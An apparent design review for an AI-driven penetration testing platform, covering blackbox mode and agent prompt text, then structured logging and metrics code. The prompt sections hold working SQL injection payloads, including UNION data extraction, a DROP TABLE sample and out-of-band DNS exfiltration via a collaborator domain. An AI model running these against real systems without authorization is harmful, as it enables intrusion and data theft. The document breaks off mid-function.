# Shannon Platform: Architecture Review & Enhancement Plan

## Executive Summary

This document provides a comprehensive architecture review of the Shannon penetration testing platform, with specific focus on:
1. **Blackbox Testing Design** - Making it work effectively without source code
2. **Logging & Observability** - Detailed instrumentation for debugging and improvement
3. **Architectural Improvements** - Making the system more robust and maintainable

---

## Table of Contents

1. [Current Architecture Overview](#current-architecture-overview)
2. [Blackbox Testing Design](#blackbox-testing-design)
3. [Logging & Observability System](#logging-observability-system)
4. [Architecture Improvements](#architecture-improvements)
5. [Kali Linux Integration](#kali-linux-integration)
6. [Implementation Roadmap](#implementation-roadmap)

---

## 1. Current Architecture Overview

### 1.1 High-Level Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                        Shannon CLI                               │
│                      (shannon.mjs)                               │
└───────────────────┬─────────────────────────────────────────────┘
                    │
         ┌──────────┴──────────┐
         │                     │
    ┌────▼─────┐        ┌─────▼──────┐
    │ Session  │        │ Checkpoint │
    │ Manager  │        │ Manager    │
    └────┬─────┘        └─────┬──────┘
         │                    │
         │    ┌───────────────┴────────────────┐
         │    │                                 │
    ┌────▼────▼────┐                   ┌───────▼────────┐
    │ Audit System │                   │  Git Repository│
    │  (v3.0)      │                   │  (Checkpoints) │
    └────┬─────────┘                   └────────────────┘
         │
         │
    ┌────▼─────────────────────────────────────────────────┐
    │           5-Phase Pipeline                           │
    ├──────────────────────────────────────────────────────┤
    │ 1. Pre-Recon    → External tools + code analysis     │
    │ 2. Recon        → Attack surface mapping             │
    │ 3. Vuln Analysis→ 5 parallel agents (inj/xss/etc)    │
    │ 4. Exploitation → 5 parallel agents                  │
    │ 5. Reporting    → Executive report generation        │
    └──────────────────┬───────────────────────────────────┘
                       │
           ┌───────────┼───────────┐
           │           │           │
      ┌────▼────┐ ┌───▼────┐ ┌───▼─────┐
      │  Claude │ │ Kali   │ │ Browser │
      │   API   │ │ Tools  │ │ (MCP)   │
      └─────────┘ └────────┘ └─────────┘
```

### 1.2 Core Components Analysis

#### ✅ Strengths

| Component | Current State | Quality |
|:----------|:-------------|:--------|
| **Session Management** | Persistent state, crash recovery | ⭐⭐⭐⭐⭐ |
| **Checkpoint System** | Git-based rollback, atomic | ⭐⭐⭐⭐⭐ |
| **Audit System v3** | Crash-safe, append-only logs | ⭐⭐⭐⭐⭐ |
| **Config Parser** | YAML + JSON Schema validation | ⭐⭐⭐⭐ |
| **Error Handling** | Categorized, retryable errors | ⭐⭐⭐⭐ |
| **Tool Integration** | 15+ security tools, preflight checks | ⭐⭐⭐⭐ |

#### ⚠️ Gaps

| Area | Current Gap | Impact |
|:-----|:-----------|:-------|
| **Blackbox Testing** | Relies heavily on code analysis | High - limits real-world use |
| **Observability** | Basic logging, no structured tracing | Medium - hard to debug |
| **Performance** | Sequential execution in some phases | Medium - slow scans |
| **Tool Failures** | Basic error handling, no circuit breaker | Low - can hang on bad tools |
| **Rate Limiting** | No adaptive throttling | Medium - can trigger WAF/IPS |
| **Evidence Chain** | Good but not forensically complete | Low - hard to reproduce findings |

---

## 2. Blackbox Testing Design

### 2.1 The Blackbox Problem

**Current Issue**: Shannon is designed as a "white-box" tester that expects:
- Source code repository access
- Static analysis of application logic
- File system access to configuration files

**Real-world Reality**: Most pentests are blackbox:
- No source code access
- Only HTTP/network access
- Must infer behavior from responses

### 2.2 Blackbox-First Architecture

#### Design Principle
> **HTTP responses are first-class citizens, source code is optional context**

```
Traditional Shannon (White-box):
┌──────────┐      ┌──────────┐      ┌──────────┐
│  Source  │─────▶│ Analysis │─────▶│  Report  │
│   Code   │      │          │      │          │
└──────────┘      └──────────┘      └──────────┘
                       ▲
                       │ (minor)
                  ┌────┴────┐
                  │  HTTP   │
                  │ Testing │
                  └─────────┘

Proposed Shannon (Blackbox-first):
┌──────────┐      ┌──────────┐      ┌──────────┐
│  HTTP    │─────▶│ Analysis │─────▶│  Report  │
│ Testing  │      │          │      │          │
└──────────┘      └──────────┘      └──────────┘
                       ▲
                       │ (optional)
                  ┌────┴────┐
                  │ Source  │
                  │  Code   │
                  └─────────┘
```

### 2.3 Blackbox Mode Implementation

#### A. New Configuration Flag

**File**: `configs/example-config.yaml`

```yaml
mode: "blackbox"  # or "whitebox" (default) or "hybrid"

blackbox:
  # When no source code is available
  max_fuzzing_depth: 3
  wordlists:
    - "/usr/share/wordlists/dirb/common.txt"
    - "/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt"
  
  # Aggressive discovery
  crawl_depth: 5
  parameter_discovery: true
  schema_inference: true
  
  # Evidence collection
  screenshot_on_finding: true
  save_har_files: true
  
  # Adaptive behavior
  reduce_code_analysis_confidence: true  # Lower trust in inferred behavior
  require_http_validation: true           # Must validate via HTTP
```

#### B. Update Pre-Recon Agent

**File**: `prompts/pre-recon-code.txt`

Add mode detection:

```markdown
## Operating Mode Detection

<mode_check>
Check the configuration to determine operating mode:

**If mode == "blackbox":**
- Skip source code static analysis
- Focus on HTTP-based discovery
- Use aggressive fuzzing and crawling
- Require actual HTTP responses for all findings
- Mark all inferred findings as "low confidence" unless HTTP-validated

**If mode == "whitebox" or "hybrid":**
- Perform full static analysis
- Use code insights to guide HTTP testing
- High confidence on code-based findings
</mode_check>

## Blackbox Discovery Workflow

When in blackbox mode, execute these phases:

### Phase 1: Active Enumeration
1. **Directory Brute Force**:
   ```bash
   feroxbuster -u $TARGET \
     -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
     -t 50 \
     -d 3 \
     --json -o ferox.json
   ```

2. **Parameter Discovery**:
   ```bash
   arjun -u $TARGET/endpoint \
     --stable \
     -oJ params.json
   ```

3. **Technology Fingerprinting**:
   ```bash
   whatweb $TARGET \
     --aggression 3 \
     --log-json=tech.json
   ```

### Phase 2: Schema Inference
When no source code is available, build an API schema from observations:

1. **Collect all HTTP responses**
2. **Infer parameter types** from error messages:
   - "Invalid integer" → parameter is integer type
   - "Email format invalid" → parameter is email string
   - "Must be between 1-100" → parameter has range validation

3. **Build endpoint map**:
   ```json
   {
     "POST /api/users": {
       "parameters": {
         "email": {"type": "email", "required": true, "inferred_from": "error_message"},
         "age": {"type": "integer", "min": 18, "inferred_from": "validation_error"}
       },
       "confidence": "medium"  // Because inferred, not from code
     }
   }
   ```

### Phase 3: JavaScript Analysis
Extract API calls and secrets from client-side code:

```bash
# Download all JS files
wget -r -l 1 -H -t 1 -nd -N -np -A.js -erobots=off $TARGET

# Extract endpoints
grep -rE "(fetch|axios|XMLHttpRequest|\.get|\.post)\(" *.js | \
  grep -oP "(http|\/)[^\s'\")]*" > endpoints.txt

# Find secrets
trufflehog filesystem . --json --no-verification > secrets.json
```

### Phase 4: Behavioral Testing
Without source code, test actual behavior:

1. **Boundary Testing**: Send edge cases to every parameter
2. **Error Analysis**: Collect error messages to infer backend logic
3. **Timing Analysis**: Detect blind injection via response times
4. **State Tracking**: Map application state machines through observation
```

#### C. Update Vulnerability Agents

**File**: `prompts/vuln-injection.txt`

Add blackbox detection patterns:

```markdown
## Blackbox SQL Injection Detection

Since you don't have source code access, detect SQLi through:

### 1. Error-Based Detection
**Send payloads that trigger DB errors**:

```bash
# Test every parameter with these payloads
PAYLOADS=(
  "'"                        # Syntax error
  "1' OR '1'='1"            # Boolean injection
  "1' AND 1=2 UNION SELECT NULL--"  # UNION injection
  "1'; DROP TABLE users--"  # Stacked queries (won't execute but may error)
)

for param in email username id; do
  for payload in "${PAYLOADS[@]}"; do
    curl "$TARGET?$param=$payload" 2>&1 | tee response.txt
    
    # Check for SQL errors in response
    if grep -qE "(mysql|postgresql|sqlite|mssql|oracle).*error" response.txt; then
      echo "FINDING: SQLi in parameter $param"
    fi
  done
done
```

### 2. Boolean-Based Blind Detection
**When no errors are returned**:

```python
# Differential analysis
import requests

def test_blind_sqli(url, param):
    # Baseline: normal value
    r1 = requests.get(f"{url}?{param}=1")
    
    # True condition: should match baseline
    r2 = requests.get(f"{url}?{param}=1' AND '1'='1")
    
    # False condition: should differ from baseline
    r3 = requests.get(f"{url}?{param}=1' AND '1'='2")
    
    # Analysis
    if len(r1.text) == len(r2.text) and len(r1.text) != len(r3.text):
        return True  # Likely SQL injection
    return False
```

### 3. Time-Based Blind Detection
**Last resort when no output differences**:

```bash
# Test if database is delaying responses
time curl "$TARGET?id=1'; SELECT SLEEP(5)--"
# If response takes ~5 seconds → SQLi confirmed

# Platform-specific payloads
# MySQL:      1' AND SLEEP(5)--
# PostgreSQL: 1'; SELECT pg_sleep(5)--
# MSSQL:      1'; WAITFOR DELAY '00:00:05'--
# Oracle:     1' AND dbms_lock.sleep(5)--
```

### 4. Out-of-Band Detection
**When all else fails**:

```bash
# DNS exfiltration (requires Burp Collaborator or similar)
PAYLOAD="1' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT+user()),'.$COLLABORATOR_DOMAIN\\abc'))--"

curl "$TARGET?id=$PAYLOAD"

# Check collaborator for DNS query containing database user
```

## Confidence Levels in Blackbox Mode

Mark findings with appropriate confidence:

| Evidence | Confidence | Example |
|:---------|:----------|:--------|
| SQL error message visible | **HIGH** | "You have an error in your SQL syntax" |
| Boolean logic works | **MEDIUM** | True/False responses differ |
| Timing difference observed | **MEDIUM** | 5-second delay on SLEEP() |
| Inferred from behavior | **LOW** | Application seems to query DB |
| No validation observed | **POTENTIAL** | Parameter not sanitized (need to test) |
```

**File**: `prompts/exploit-injection.txt`

Update exploitation to not rely on code:

```markdown
## Blackbox Exploitation Strategy

### Rule 1: Never Assume Code Behavior
- ❌ "The code uses parameterized queries" → Skip this assumption
- ✅ "When I send X, I get Y response" → Base everything on HTTP evidence

### Rule 2: Build Evidence Through Experimentation
Every exploitation step must include:
1. **Hypothesis**: "I believe parameter X is vulnerable to SQLi"
2. **Test**: Send specific payload and observe response
3. **Evidence**: Save full HTTP request/response
4. **Conclusion**: Confirmed/Denied based on evidence

### Rule 3: Document Everything
For every test:

```json
{
  "test_id": "sqli-001",
  "timestamp": "2025-01-15T10:30:00Z",
  "hypothesis": "Email parameter vulnerable to SQL injection",
  "request": {
    "method": "POST",
    "url": "https://target.com/api/login",
    "headers": {...},
    "body": {"email": "admin'--", "password": "test"}
  },
  "response": {
    "status": 500,
    "headers": {...},
    "body": "MySQL error: You have an error in your SQL syntax...",
    "time_ms": 245
  },
  "conclusion": "CONFIRMED - SQL syntax error indicates injection point",
  "confidence": "high",
  "evidence_file": "sqli-001-response.txt"
}
```

### Rule 4: Use Multi-Phase Validation

**Phase 1 - Confirm Vulnerability Exists**:
- Send error-triggering payload
- Observe database errors
- Confirm injection point

**Phase 2 - Identify Database Type**:
```bash
# MySQL
curl -X POST "$TARGET/login" -d "email=admin' AND @@version--"

# PostgreSQL  
curl -X POST "$TARGET/login" -d "email=admin' AND version()--"

# MSSQL
curl -X POST "$TARGET/login" -d "email=admin' AND @@version--"
```

**Phase 3 - Extract Data**:
```bash
# Example: Extract usernames
curl "$TARGET?id=1' UNION SELECT username FROM users--"

# Save evidence
curl "$TARGET?id=1' UNION SELECT username FROM users--" > evidence/sqli-usernames.txt
```

**Phase 4 - Document Impact**:
```markdown
## Exploitation Evidence: SQL Injection in Login Form

### Vulnerability Confirmed
- **Location**: POST /api/login, email parameter
- **Database**: MySQL 5.7.32
- **Evidence File**: evidence/sqli-mysql-version.txt

### Data Extracted
- **Tables Found**: users, orders, payments
- **Sensitive Data**: 150 user credentials extracted
- **Evidence File**: evidence/sqli-users-dump.txt

### Impact
- Complete database compromise
- PII exposure (emails, hashed passwords)
- Business data access (order history)
```
```

### 2.4 Blackbox Testing Checklist

Create `prompts/shared/blackbox-checklist.txt`:

```markdown
# Blackbox Pentesting Checklist

Before marking a vulnerability as "confirmed", verify:

## ✅ HTTP Evidence Requirements

### For SQL Injection
- [ ] Error message captured showing SQL syntax error
- [ ] Database type identified (MySQL, PostgreSQL, etc.)
- [ ] Sample query result obtained (UNION SELECT proof)
- [ ] Evidence saved: request.txt + response.txt

### For XSS
- [ ] Payload reflected in response body
- [ ] Payload executed in browser (screenshot)
- [ ] Alert box or HTTP callback received
- [ ] Evidence saved: screenshot + HAR file

### For IDOR
- [ ] Baseline request to own resource works (200 OK)
- [ ] Modified request to other user's resource works (200 OK)
- [ ] Response contains other user's data (confirmed via diff)
- [ ] Evidence saved: both responses for comparison

### For Authentication Bypass
- [ ] Unauthenticated request normally blocked (401/403)
- [ ] Bypass technique grants access (200 OK)
- [ ] Protected data/functionality accessed
- [ ] Evidence saved: before/after bypass

### For Authorization Bypass
- [ ] Low-privilege user blocked from resource (403)
- [ ] Privilege escalation technique works (200 OK)
- [ ] Admin-level data/functionality accessed
- [ ] Evidence saved: both user levels tested

## 📊 Confidence Scoring

| Evidence Quality | Confidence | Report As |
|:----------------|:----------|:----------|
| HTTP response shows clear exploitation | HIGH | Confirmed Vulnerability |
| Behavior indicates vuln but not fully proven | MEDIUM | Likely Vulnerable |
| Inferred from testing but unconfirmed | LOW | Potential Vulnerability |
| Theoretical vuln, no HTTP evidence | N/A | Do Not Report |

## 🚫 Do Not Report Without HTTP Evidence

Never report based solely on:
- "The parameter is not validated in code" (without testing)
- "This endpoint might be vulnerable" (without proof)
- "I think this could lead to..." (without demonstration)

Always include:
- Actual HTTP request that triggers the vulnerability
- Actual HTTP response showing the impact
- Step-by-step reproduction instructions
```

---

## 3. Logging & Observability System

### 3.1 Current Logging Analysis

**What Exists**:
```javascript
// src/audit/logger.js
- Append-only event logging
- Event types: tool_start, tool_end, llm_response
- Crash-safe (immediate flush)
```

**What's Missing**:
- Structured tracing (can't follow a request through pipeline)
- Performance profiling (where is time spent?)
- Cost attribution (which agent costs most?)
- Error aggregation (which errors happen most?)
- Evidence chain tracking (vuln finding → exploitation → report)

### 3.2 Enhanced Logging Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                   Logging Architecture                       │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌───────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐  │
│  │  Trace    │  │ Metrics  │  │  Events  │  │  Errors  │  │
│  │  Logger   │  │ Collector│  │  Logger  │  │  Tracker │  │
│  └─────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘  │
│        │             │              │             │         │
│        └─────────────┴──────────────┴─────────────┘         │
│                      │                                       │
│              ┌───────▼────────┐                             │
│              │  Log Aggregator │                            │
│              └───────┬─────────┘                            │
│                      │                                       │
│         ┌────────────┼────────────┐                         │
│         │            │            │                         │
│    ┌────▼────┐  ┌───▼────┐  ┌───▼─────┐                   │
│    │ Console │  │  File  │  │ Metrics │                    │
│    │ Output  │  │  Logs  │  │   DB    │                    │
│    └─────────┘  └────────┘  └─────────┘                    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 3.3 Implementation: Structured Logging

#### A. Create Trace ID System

**File**: `src/logging/trace.js`

```javascript
/**
 * Distributed Tracing for Shannon
 * 
 * Provides trace context through entire request flow:
 * HTTP Request → Agent → Tool Call → LLM Call → Finding → Report
 */

import { randomBytes } from 'crypto';

class TraceContext {
  constructor(sessionId, agentName) {
    this.traceId = this.generateTraceId();
    this.sessionId = sessionId;
    this.agentName = agentName;
    this.spans = [];
    this.startTime = Date.now();
  }

  generateTraceId() {
    return randomBytes(16).toString('hex');
  }

  /**
   * Start a new span (unit of work)
   * @param {string} name - Span name (e.g., "http_request", "llm_call")
   * @param {object} attributes - Additional context
   */
  startSpan(name, attributes = {}) {
    const span = {
      spanId: randomBytes(8).toString('hex'),
      traceId: this.traceId,
      name,
      startTime: Date.now(),
      attributes,
      events: [],
      status: 'in_progress'
    };

    this.spans.push(span);
    return span;
  }

  /**
   * End a span
   * @param {object} span - The span to end
   * @param {string} status - 'success' or 'error'
   * @param {object} result - Final result/error
   */
  endSpan(span, status = 'success', result = null) {
    span.endTime = Date.now();
    span.duration = span.endTime - span.startTime;
    span.status = status;
    span.result = result;
  }

  /**
   * Add event to span
   * @param {object} span - Target span
   * @param {string} name - Event name
   * @param {object} data - Event data
   */
  addEvent(span, name, data = {}) {
    span.events.push({
      timestamp: Date.now(),
      name,
      data
    });
  }

  /**
   * Export trace for logging
   */
  export() {
    return {
      traceId: this.traceId,
      sessionId: this.sessionId,
      agentName: this.agentName,
      startTime: this.startTime,
      endTime: Date.now(),
      duration: Date.now() - this.startTime,
      spans: this.spans
    };
  }
}

export default TraceContext;
```

#### B. Enhanced Metrics Collector

**File**: `src/logging/metrics.js`

```javascript
/**
 * Detailed Metrics Collection
 * 
 * Tracks:
 * - Performance (latency, throughput)
 * - Cost (LLM tokens, API calls)
 * - Quality (findings, false positives)
 * - Reliability (errors, retries)
 */

class MetricsCollector {
  constructor() {
    this.metrics = {
      performance: {},
      cost: {},
      quality: {},
      reliability: {}
    };
  }

  /**
   * Record HTTP request metrics
   */
  recordHttpRequest(data) {
    const { url, method, statusCode, duration, size, error } = data;

    if (!this.metrics.performance.http) {
      this.metrics.performance.http = {
        total_requests: 0,
        successful_requests: 0,
        failed_requests: 0,
        total_bytes: 0,
        latencies: [],
        status_codes: {}
      };
    }

    const http = this.metrics.performance.http;
    http.total_requests++;
    
    if (statusCode >= 200 && statusCode < 300) {
      http.successful_requests++;
    } else {
      http.failed_requests++;
    }

    http.total_bytes += size || 0;
    http.latencies.push(duration);
    http.status_codes[statusCode] = (http.status_codes[statusCode] || 0) + 1;
  }

  /**
   * Record tool execution metrics
   */
  recordToolExecution(data) {
    const { tool, duration, success, outputSize, error } = data;

    if (!this.metrics.performance.tools) {
      this.metrics.performance.tools = {};
    }

    if (!this.metrics.performance.tools[tool]) {
      this.metrics.performance.tools[tool] = {
        executions: 0,
        successes: 0,
        failures: 0,
        durations: [],
        errors: []
      };
    }

    const t = this.metrics.performance.tools[tool];
    t.executions++;
    
    if (success) {
      t.successes++;
    } else {
      t.failures++;
      t.errors.push({ timestamp: Date.now(), error });
    }

    t.durations.push(duration);
  }

  /**
   * Record LLM API call metrics
   */
  recordLlmCall(data) {
    const { model, inputTokens, outputTokens, duration, cost, error } = data;

    if (!this.metrics.cost.llm) {
      this.metrics.cost.llm = {
        total_calls: 0,
        total_input_tokens: 0,
        total_output_tokens: 0,
        total_cost: 0,
        by_model: {}
      };
    }

    const llm = this.metrics.cost.llm;
    llm.total_calls++;
    llm.total_input_tokens += inputTokens;
    llm.total_output_tokens += outputTokens;
    llm.total_cost += cost || 0;

    if (!llm.by_model[model]) {
      llm.by_model[model] = {
        calls: 0,
        input_tokens: 0,
        output_tokens: 0,
        cost: 0
      };
    }

    llm.by_model[model].calls++;
    llm.by_model[model].input_tokens += inputTokens;
    llm.by_model[model].output_tokens += outputTokens;
    llm.by_model[model].cost += cost || 0;
  }

  /**
   * Record vulnerability finding
   */
  recordFinding(data) {
    const { type, severity, confidence, agent, validated } = data;

    if (!this.metrics.quality.findings) {
      this.metrics.quality.findings = {
        total: 0,
        by_type: {},
        by_severity: {},
        by_confidence: {},
        validated: 0,
        false_positives: 0
      };
    }

    const f = this.metrics.quality.findings;
    f.total++;

    // By type
    f.by_type[type] = (f.by_type[type] || 0) + 1;

    // By severity
    f.by_severity[severity] = (f.by_severity[severity] || 0) + 1;

    // By confidence
    f.by_confidence[confidence] = (f.by_confidence[confidence] || 0) + 1;

    // Validation status
    if (validated === true) {
      f.validated++;
    } else if (validated === false) {
      f.false_positives++;
    }
  }

  /**
   * Record error occurrence
   */
  recordError(data) {
    const { type, message, stack, retryable, agent } = data;

    if (!this.metrics.reliability.errors) {
      this.metrics.reliability.errors = {
        total: 0,
        by_type: {},
        by_agent: {},
        retryable: 0,
        fatal: 0
      };
    }

    const e = this.metrics.reliability.errors;
    e.total++;

    e.by_type[type] = (e.by_type[type] || 0) + 1;
    e.by_agent[agent] = (e.by_agent[agent] || 0) + 1;

    if (retryable) {
      e.retryable++;
    } else {
      e.fatal++;
    }
  }

  /**
   * Calculate aggregated statistics
   */
  getStats() {
    const stats = {
      performance: {},
      cost: {},
      quality: {},
      reliability: {}
    };

    // HTTP performance stats
    if (this.metrics.performance.http) {
      const http = this.metrics.performance.http;
      stats.performance.http = {
        total_requests: http.total_requests,
        success_rate: (http.successful_requests / http.total_requests * 100).toFixed(2) + '%',
        avg_latency_ms: (http.latencies.reduce((a, b) => a + b, 0) / http.latencies.length).toFixed(0),
        p95_latency_ms: this.percentile(http.latencies, 0.95).toFixed(0),
        p99_latency_ms: this.percentile(http.latencies, 0.99).toFixed(0),
        total_mb: (http.total_bytes / 1024 / 1024).toFixed(2)
      };
    }

    // Tool execution stats
    if (this.metrics.performance.tools) {
      stats.performance.tools = {};
      for (const [tool, data] of Object.entries(this.metrics.performance.tools)) {
        stats.performance.tools[tool] = {
          executions: data.executions,
          success_rate: (data.successes / data.executions * 100).toFixed(2) + '%',
          avg_duration_ms: (data.durations.reduce((a, b) => a + b, 0) / data.durations.length).toFixed(0),
          failure_count: data.failures
        };
      }
    }

    // LLM cost stats
    if (this.metrics.cost.llm) {
      const llm = this.metrics.cost.llm;
      stats.cost.llm = {
        total_calls: llm.total_calls,
        total_tokens: llm.total_input_tokens + llm.total_output_tokens,
        total_cost_usd: llm.total_cost.toFixed(2),
        avg_cost_per_call: (llm.total_cost / llm.total_calls).toFixed(4),
        by_model: llm.by_model
      };
    }

    // Quality stats
    if (this.metrics.quality.findings) {
      const f = this.metrics.quality.findings;
      stats.quality.findings = {
        total: f.total,
        validated: f.validated,
        false_positives: f.false_positives,
        validation_rate: f.validated > 0 ? 
          (f.validated / (f.validated + f.false_positives) * 100).toFixed(2) + '%' : 'N/A',
        by_type: f.by_type,
        by_severity: f.by_severity,
        by_confidence: f.by_confidence
      };
    }

    // Reliability stats
    if (this.metrics.reliability.errors) {
      const e = this.metrics.reliability.errors;
      stats.reliability.errors = {
        total: e.total,
        retryable: e.retryable,
        fatal: e.fatal,
        by_type: e.by_type,
        by_agent: e.by_agent
      };
    }

    return stats;
  }

  /**
   * Calculate percentile
   */
  percentile(arr, p) {
    if (arr.length === 0) return 0;
    const sorted = arr.slice().sort((a, b) => a - b);
    const index = Math.ceil(sorted.length * p) - 1;
    return sorted[index];
  }

  /**
   * Export metrics to JSON
   */
  export() {
    return {
      raw_metrics: this.metrics,
      statistics: this.getStats(),
      generated_at: new Date().toISOString()
    };
  }
}

export default MetricsCollector;
```

#### C. Unified Logger Interface

**File**: `src/logging/unified-logger.js`

```javascript
/**
 * Unified Logging Interface
 * 
 * Single entry point for all logging needs:
 * - Traces
 * - Metrics
 * - Events
 * - Errors
 */

import fs from 'fs';
import path from 'path';
import chalk from 'chalk';
import TraceContext from './trace.js';
import MetricsCollector from './metrics.js';

class UnifiedLogger {
  constructor(sessionId, outputDir) {
    this.sessionId = sessionId;
    this.outputDir = outputDir;
    this.traces = [];
    this.metrics = new MetricsCollector();
    this.currentTrace = null;
    
    // Create log directories
    this.logsDir = path.join(outputDir, 'logs');
    this.tracesDir = path.join(this.logsDir, 'traces');
    this.metricsDir = path.join(this.logsDir, 'metrics');
    this.eventsDir = path.join(this.logsDir, 'events');
    
    for (const dir of [this.logsDir, this.tracesDir, this.metricsDir, this.eventsDir]) {
      if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
      }
    }
    
    // Open event log file
    this.eventLogPath = path.join(this.eventsDir, 'events.ndjson');
    this.eventLogStream = fs.createWriteStream(this.eventLogPath, { flags: 'a' });
  }

  /**
   * Start a new trace
   */
  startTrace(agentName) {
    this.currentTrace = new TraceContext(this.sessionId, agentName);
    this.traces.push(this.currentTrace);
    
    this.logEvent({
      type: 'trace_start',
      traceId: this.currentTrace.traceId,
      agentName
    });
    
    return this.currentTrace;
  }

  /**
   * End current trace
   */
  endTrace(status = 'success') {
    if (!this.currentTrace) return;
    
    const trace = this.currentTrace.export();
    
    // Save trace to file
    const traceFile = path.join(
      this.tracesDir,
      `${this.currentTrace.agentName}-${this.currentTrace.traceId}.json`
    );
    fs.writeFileSync(traceFile, JSON.stringify(trace, null, 2));
    
    this.logEvent({
      type: 'trace_end',
      traceId: this.currentTrace.traceId,
      agentName: this.currentTrace.agentName,
      duration: trace.duration,
      status
    });
    
    this.currentTrace = null;
  }

  /**
   * Log a structured event
   */
  logEvent(event) {
    const enrichedEvent = {
      timestamp: new Date().toISOString(),
      sessionId: this.sessionId,
      traceId: this.currentTrace?.traceId,
      ...event
    };
    
    // Write to NDJSON event log
    this.eventLogStream.write(JSON.stringify(enrichedEvent) + '\n');
    
    // Console output (formatted)
    this.consoleLog(enrichedEvent);
  }

  /**
   * Console logging with color and formatting
   */
  consoleLog(event) {
    const timestamp = new Date().toLocaleTimeString();
    const traceId = event.traceId ? chalk.gray(`[${event.traceId.slice(0, 8)}]`) : '';
    
    switch (event.type) {
      case 'trace_start':
        console.log(chalk.blue(`[${timestamp}] ${traceId} 🚀 Starting ${event.agentName}`));
        break;
      
      case 'trace_end':
        const duration = (event.duration / 1000).toFixed(2);
        const status = event.status === 'success' ? chalk.green('✓') : chalk.red('✗');
        console.log(chalk.blue(`[${timestamp}] ${traceId} ${status} Completed ${event.agentName} in ${duration}s`));
        break;
      
      case 'http_request':
        const method = chalk.cyan(event.method);
        const url = event.url;
        const statusCode = event.statusCode >= 400 ? chalk.red(event.statusCode) : chalk.green(event.statusCode);
        console.log(chalk.gray(`[${timestamp}] ${traceId}   ${method} ${url} → ${statusCode} (${event.duration}ms)`));
        break;
      
      case 'tool_start':
        console.log(chalk.yellow(`[${timestamp}] ${traceId}   🔧 Running ${event.tool}...`));
        break;
      
      case 'tool_end':
        const toolStatus = event.success ? chalk.green('✓') : chalk.red('✗');
        console.log(chalk.yellow(`[${timestamp}] ${traceId}   ${toolStatus} ${event.tool} completed in ${event.duration}ms`));
        break;
      
      case 'llm_call':
        const tokens = event.inputTokens + event.outputTokens;
        const cost = event.cost ? `$${event.cost.toFixed(4)}` : 'N/A';
        console.log(chalk.magenta(`[${timestamp}] ${traceId}   🤖 LLM ${event.model}: ${tokens} tokens, ${cost}`));
        break;
      
      case 'finding':
        const severity = event.severity === 'critical' ? chalk.red('CRITICAL') :
                        event.severity === 'high' ? chalk.red('HIGH') :
                        event.severity === 'medium' ? chalk.yellow('MEDIUM') :
                        chalk.blue('LOW');
        console.log(chalk.green(`[${timestamp}] ${traceId}   🔍 Finding: ${severity} ${event.type} (confidence: ${event.confidence})`));
        break;
      
      case 'error':
        console.log(chalk.red(`[${timestamp}] ${traceId}   ❌ Error: ${event.message}`));
        if (event.retryable) {
          console.log(chalk.yellow(`[${timestamp}] ${traceId}      ↻ Will retry...`));
        }
        break;
      
      default:
        console.log(chalk.gray(`[${timestamp}] ${traceId}   ${event.type}: ${JSON.stringify(event)}`));
    }
  }

  /**
   * Record metrics (delegates to MetricsCollector)
   */
  recordMetric(type, data) {
    switch (type) {
      case 'http_request':
        this.metrics.recordHttpRequest(data);
        break;
      case 'tool_execution':
        this.metrics.recordToolExecution(data);
        break;
      case 'llm_call':
        this.metrics.recordLlmCall(data);
        break;
      case 'finding':
        this.metrics.recordFinding(data);
        break;
      case 'error':
        this.metrics.recordError(data);
        break;
    }
  }

  /**
   * Generate metrics report
   */
  saveMetrics() {
    const metricsReport = this.metrics.export();
    const metricsFile = path.join(this.metricsDir, 'metrics.json');
    fs.writeFileSync(metricsFile, JSON.stringify(metricsReport, null, 2));
    
    // Also save human-readable summary
    const stats = this.metrics.getStats();
    const summaryFile = path.join(this.metricsDir, 'summary.txt');
    fs.writeFileSync(summaryFile, this.formatMetricsSummary(stats));
    
    console.log(chalk.green(`\n📊 Metrics saved to ${this.metricsDir}/`));
  }

  /**
   * Format metrics summary for human reading
   */
  formatMetricsSummary(stats) {
    let summary = '# Shannon Metrics Summary\n\n';
    
    summary += '## Performance\n\n';
    if (stats.performance.http) {
      const http = stats.performance.http;
      summary += `### HTTP Requests\n`;
      summary += `- Total: ${http.total_requests}\n`;
      summary += `- Success Rate: ${http.success_rate}\n`;
      summary += `- Avg Latency: ${http.avg_latency_ms}ms\n`;
      summary += `- P95 Latency: ${http.p95_latency_ms}ms\n`;
      summary += `- P99 Latency: ${http.p99_latency_ms}ms\n`;
      summary += `- Data Transferred: ${http.total_mb} MB\n\n`;
    }
    
    if (stats.performance.tools) {
      summary += `### Tool Execution\n`;
      for (const [tool, data] of Object.entries(stats.performance.tools)) {
        summary += `- ${tool}: ${data.executions} runs, ${data.success_rate} success, ${data.avg_duration_ms}ms avg\n`;
      }
      summary += '\n';
    }
    
    summary += '## Cost\n\n';
    if (stats.cost.llm) {
      const llm = stats.cost.llm;
      summary += `### LLM API Usage\n`;
      summary += `- Total Calls: ${llm.total_calls}\n`;
      summary += `- Total Tokens: ${llm.total_tokens.toLocaleString()}\n`;
      summary += `- Total Cost: $${llm.total_cost_usd}\n`;
      summary += `- Avg Cost/Call: $${llm.avg_cost_per_call}\n\n`;
      
      for (const [model, data] of Object.entries(llm.by_model)) {
        summary += `#### ${model}\n`;
        summary += `- Calls: ${data.calls}\n`;
        summary += `- Tokens: ${(data.input_tokens + data.output_tokens).toLocaleString()}\n`;
        summary += `- Cost: $${data.cost.toFixed(4)}\n\n`;
      }
    }
    
    summary += '## Quality\n\n';
    if (stats.quality.findings) {
      const f = stats.quality.findings;
      summary += `### Findings\n`;
      summary += `- Total: ${f.total}\n`;
      summary += `- Validated: ${f.validated}\n`;
      summary += `- False Positives: ${f.false_positives}\n`;
      summary += `- Validation Rate: ${f.validation_rate}\n\n`;
      
      summary += `### By Type\n`;
      for (const [type, count] of Object.entries(f.by_type)) {
        summary += `- ${type}: ${count}\n`;
      }
      summary += '\n';
      
      summary += `### By Severity\n`;
      for (const [severity, count] of Object.entries(f.by_severity)) {
        summary += `- ${severity}: ${count}\n`;
      }
      summary += '\n';
    }
    
    summary += '## Reliability\n\n';
    if (stats.reliability.errors) {
